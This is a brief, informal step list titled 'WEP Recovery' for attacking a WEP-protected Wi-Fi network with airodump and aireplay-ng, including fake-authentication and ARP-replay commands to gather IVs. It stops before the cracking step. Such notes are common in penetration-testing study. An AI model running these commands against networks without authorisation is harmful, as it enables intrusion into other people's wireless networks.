WEP Recovery

1) GO into monitor mode

2) airodump the network you to attack will including the write switch

3) we need to catch as many IVs as we can as much as 20,000 will do but ideally 100,000 is best.
--To speed up the prosses of catching IVs we will issue the aireplay command
"aireplay-ng -1 0 -e (ESSID) -a (BSSID) (interface such as wlan0mon"

4) After issuing the previous command we will issue another command
"aireplay-ng -3 -b (bssid) (interface)"
